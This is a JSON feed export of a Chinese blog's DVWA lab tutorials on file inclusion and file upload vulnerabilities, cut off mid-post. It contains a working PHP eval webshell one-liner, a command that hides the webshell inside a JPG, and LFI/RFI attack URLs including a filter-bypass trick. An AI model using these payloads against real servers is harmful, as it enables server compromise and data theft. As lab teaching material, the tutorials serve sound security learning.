{
    "version": "https://jsonfeed.org/version/1",
    "title": "Harold • All posts by \"owasp安全渗透实战\" category",
    "description": "我踏清风寻杨柳，谁有龙虾谁有酒。清风深知杨柳意，啤酒龙虾又相聚。",
    "home_page_url": "https://harold-666.github.io",
    "items": [
        {
            "id": "https://harold-666.github.io/Kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/OWASP%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/file_inclusion/",
            "url": "https://harold-666.github.io/Kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/OWASP%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/file_inclusion/",
            "title": "文件包含漏洞",
            "date_published": "2021-01-26T12:38:00.000Z",
            "content_html": "<h1 id=\"文件包含漏洞\"><a class=\"anchor\" href=\"#文件包含漏洞\">#</a> 文件包含漏洞</h1>\n<h2 id=\"principle-and-harm\"><a class=\"anchor\" href=\"#principle-and-harm\">#</a> Principle and Harm</h2>\n<p><strong>文件包含漏洞：</strong></p>\n<p>即 File Inclusion，意思是文件包含（漏洞），指当服务器开启 <code>allow_url_include</code>  选项时，就可以通过 php 的某些特性函数 <code>include() , require()和inelude_once() , require_once()</code>  利用 url 去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致住意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了 php 配置中的 <code>allow_url_fopen</code>  选项（选项开启之后，服务器允许包含一个远程的文件）。服务器通过 php 的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。</p>\n<ol>\n<li>文件包含 (File Inclusion) 即程序通过 [包含函数] 调用本地或远程文件，以此来实现拓展功能</li>\n<li>被包含的文件可以是各种文件格式，而当文件里面包含恶意代码，则会形成远程命令执行或文件上传漏洞</li>\n<li>文件包含漏洞主要发生在有包含语句的环境中，例独 PHP 所具备 include、require 等包含函数</li>\n</ol>\n<p><strong>文件包含分为两类:</strong></p>\n<ul>\n<li>本地文件包含 LFI (Local File Inclusion) 当被包含的文件在服务器本地时，就形成本地文件包含</li>\n<li>远程文件包含 RFI (Remote File Inclusion ）当被包含的文件在第三方服务器时，叫做远程文件包含</li>\n</ul>\n<h2 id=\"file-inclusion\"><a class=\"anchor\" href=\"#file-inclusion\">#</a> File Inclusion</h2>\n<h3 id=\"security-levellow\"><a class=\"anchor\" href=\"#security-levellow\">#</a> Security Level：Low</h3>\n<h4 id=\"file-inclusion-source\"><a class=\"anchor\" href=\"#file-inclusion-source\">#</a> File Inclusion Source</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'page'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//The page we wish to display </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>未做任何文件包含过滤，可使用最简单的远程文件包含</p>\n<h4 id=\"local-file-inclusion-webshell\"><a class=\"anchor\" href=\"#local-file-inclusion-webshell\">#</a> Local File Inclusion + Webshell</h4>\n<p>结合图片文件上传使用，图片不应超过 20KB，否则可能无法执行</p>\n<ol>\n<li>\n<p>制作一句话图片木马</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre># Webshell.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span><span class=\"token function\">fputs</span><span class=\"token punctuation\">(</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"shell0.php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"w\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php @eval(<span class=\"token interpolation\"><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'chopper'</span><span class=\"token punctuation\">]</span></span>); ?>\"</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 用工具 edjpgcom 生成一句话图片木马或者 Windows 命令</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>copy cat.jpg /b + Webshell.php /a cat0.jpg</pre></td></tr></table></figure></li>\n<li>\n<p>上传图片木马文件</p>\n</li>\n<li>\n<p>执行文件包含并生成后门</p>\n<p><code>http://192.168.111.18/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/cat0.jpg</code></p>\n</li>\n<li>\n<p>通过菜刀连接 Webshell</p>\n</li>\n</ol>\n<h4 id=\"remote-file-inclusion-webshell\"><a class=\"anchor\" href=\"#remote-file-inclusion-webshell\">#</a> Remote File Inclusion + Webshell</h4>\n<p>将图片马或者可生成后门文件代码的 txt 文件上传到第三方服务器，直接包含远程文件，执行文件并生成后门</p>\n<p><code>http://192.168.111.18/dvwa/vulnerabilities/fi/?page=http://192.168.111.16/cat0.txt</code></p>\n<h3 id=\"security-levelmedium\"><a class=\"anchor\" href=\"#security-levelmedium\">#</a> Security Level：Medium</h3>\n<h4 id=\"file-inclusion-source-2\"><a class=\"anchor\" href=\"#file-inclusion-source-2\">#</a> File Inclusion Source</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'page'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// The page we wish to display </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// Bad input validation</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"http://\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"https://\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>后端代码过滤了 htpp:// 和 htpps:// 字符，置空字符</p>\n<p>根据函数 <code>str_replace()</code>  可用以下原理</p>\n<p><code>'http' + 'http://' + '://' = 'http://'</code></p>\n<p>使用： <code>http://192.168.111.18/dvwa/vulnerabilities/fi/?page=hthttp://tp://192.168.111.16/cat0.txt</code></p>\n<h3 id=\"security-levelhigh\"><a class=\"anchor\" href=\"#security-levelhigh\">#</a> Security Level：High</h3>\n<h4 id=\"file-inclusion-source-3\"><a class=\"anchor\" href=\"#file-inclusion-source-3\">#</a> File Inclusion Source</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'page'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//The page we wish to display </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// Only allow include.php</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$file</span> <span class=\"token operator\">!=</span> <span class=\"token string double-quoted-string\">\"include.php\"</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"ERROR: File not found!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>后端代码显示包含文件只要不是 include.php 文件就不能包含，额... 写死了文件包含，无解吧……</p>\n",
            "tags": [
                "Kali"
            ]
        },
        {
            "id": "https://harold-666.github.io/Kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/OWASP%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/file_upload/",
            "url": "https://harold-666.github.io/Kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/OWASP%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/file_upload/",
            "title": "文件上传漏洞",
            "date_published": "2021-01-25T08:27:00.000Z",
            "content_html": "<h1 id=\"文件上传漏洞\"><a class=\"anchor\" href=\"#文件上传漏洞\">#</a> 文件上传漏洞</h1>\n<ol>\n<li>\n<p>文件上传 (File Upload) 是大部分 web 应用都具备的功能，例如用户上传附件、修改头像、分享图片 / 视频等</p>\n</li>\n<li>\n<p>正常的文件一般是文档、图片、视频等，web 应用收集之后放入后台存储，需要的时候再调用出来返回</p>\n</li>\n<li>\n<p>如果恶意文件如 PHP、ASP 等执行文件绕过 web 应用，并顺利执行，则相当于黑客直接拿到了 Webshell</p>\n</li>\n<li>\n<p>一旦黑客拿到 Webshell，则可以拿到 web 应用的数据，删除 web 文件，本地提权，进一步拿下整个服务器甚至内网</p>\n</li>\n<li>\n<p>SQL 注入攻击的对象是数据库服务，文件上传漏洞主要攻击 web 服务，实际渗透两种相结合，达到对目标的深度控制</p>\n</li>\n</ol>\n<h2 id=\"file-upload\"><a class=\"anchor\" href=\"#file-upload\">#</a> File Upload</h2>\n<h3 id=\"security-levellow\"><a class=\"anchor\" href=\"#security-levellow\">#</a> Security Level：Low</h3>\n<h4 id=\"file-upload-source\"><a class=\"anchor\" href=\"#file-upload-source\">#</a> File Upload Source</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Upload'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token variable\">$target_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">DVWA_WEB_PAGE_TO_ROOT</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"hackable/uploads/\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token variable\">$target_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$target_path</span> <span class=\"token operator\">.</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Your image was not uploaded.'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$target_path</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">' succesfully uploaded!'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>后端代码显示，没有对上传文件进行过滤，只要有上传文件就能上传成功</p>\n<h3 id=\"security-levelmedium\"><a class=\"anchor\" href=\"#security-levelmedium\">#</a> Security Level：Medium</h3>\n<h4 id=\"file-upload-source-2\"><a class=\"anchor\" href=\"#file-upload-source-2\">#</a> File Upload Source</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Upload'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token variable\">$target_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">DVWA_WEB_PAGE_TO_ROOT</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"hackable/uploads/\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token variable\">$target_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$target_path</span> <span class=\"token operator\">.</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token variable\">$uploaded_name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token variable\">$uploaded_type</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token variable\">$uploaded_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'size'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_type</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"image/jpeg\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_size</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Your image was not uploaded.'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$target_path</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">' succesfully uploaded!'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;pre>Your image was not uploaded.&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>后端代码显示上传文件类型必须为 <code>image/jpeg</code> ，并且上传文件大小必须小于 100000 字节，约等于 97.65625kb</p>\n<h4 id=\"文件上传绕过\"><a class=\"anchor\" href=\"#文件上传绕过\">#</a> 文件上传绕过</h4>\n<p>使用 Burpsuite 抓包软件拦截上传文件，对上传文件的类型信息作修改</p>\n<p><img data-src=\"https://i.vgy.me/o1yHL6.png\" alt=\"burpsuite\" /></p>\n<p><img data-src=\"https://i.vgy.me/GhuaYR.png\" alt=\"burpsuite-modify-content-type\" /></p>\n<h4 id=\"使用中国菜刀连接网站\"><a class=\"anchor\" href=\"#使用中国菜刀连接网站\">#</a> 使用中国菜刀连接网站</h4>\n<p><img data-src=\"https://i.vgy.me/yPcLCv.png\" alt=\"Cknie-connect\" /></p>\n<p><img data-src=\"https://i.vgy.me/U1svWC.png\" alt=\"Cknife-succeed\" /></p>\n<h3 id=\"security-levelhigh\"><a class=\"anchor\" href=\"#security-levelhigh\">#</a> Security Level：High</h3>\n<h4 id=\"file-upload-source-3\"><a class=\"anchor\" href=\"#file-upload-source-3\">#</a> File Upload Source</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Upload'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token variable\">$target_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">DVWA_WEB_PAGE_TO_ROOT</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"hackable/uploads/\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token variable\">$target_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$target_path</span> <span class=\"token operator\">.</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$uploaded_name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token variable\">$uploaded_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_name</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_name</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$uploaded_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'size'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_ext</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"jpg\"</span> <span class=\"token operator\">||</span> <span class=\"token variable\">$uploaded_ext</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"JPG\"</span> <span class=\"token operator\">||</span> <span class=\"token variable\">$uploaded_ext</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"jpeg\"</span> <span class=\"token operator\">||</span> <span class=\"token variable\">$uploaded_ext</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"JPEG\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_size</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Your image was not uploaded.'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td 